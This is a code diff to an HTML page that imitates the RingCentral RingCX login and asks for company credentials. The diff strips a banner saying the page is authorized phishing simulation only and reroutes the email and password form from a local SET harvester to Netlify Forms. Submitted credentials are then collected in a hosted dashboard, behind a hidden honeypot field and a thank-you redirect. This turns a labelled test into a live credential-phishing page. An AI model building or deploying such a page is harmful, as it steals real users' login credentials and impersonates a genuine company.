@@ -248,21 +248,19 @@
             text-decoration: none;
         }
 
-        .test-banner {
-            background: #fff3cd;
-            color: #664d03;
-            border-bottom: 1px solid #ffe69c;
-            padding: 8px 16px;
-            font-size: 12px;
-            text-align: center;
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
+    <!-- Static form stub required for Netlify Forms detection at deploy time -->
+    <form name="ringcx-login" netlify netlify-honeypot="bot-field" hidden>
+        <input type="email" name="email" />
+        <input type="password" name="password" />
+    </form>
+
     <div class="page">
-        <div class="test-banner">
-            Authorized security testing only — credentials are captured locally for phishing simulation.
-        </div>
 
         <header class="header">
             <span class="header-logo" aria-hidden="true">
@@ -285,8 +283,18 @@
                     <p>Use your RingCentral company credentials</p>
                 </div>
 
-                <!-- SET credential harvester requires a standard HTML POST form -->
-                <form method="post" action="https://ringcx.ringcentral.com/login">
+                <!-- Netlify Forms captures submissions in the Netlify dashboard -->
+                <form
+                    name="ringcx-login"
+                    method="POST"
+                    data-netlify="true"
+                    netlify-honeypot="bot-field"
+                    action="/thanks.html"
+                >
+                    <input type="hidden" name="form-name" value="ringcx-login" />
+                    <p class="hidden">
+                        <label>Don't fill this out: <input name="bot-field" /></label>
+                    </p>
                     <div class="field">
                         <label for="email">Email or phone number</label>
                         <input
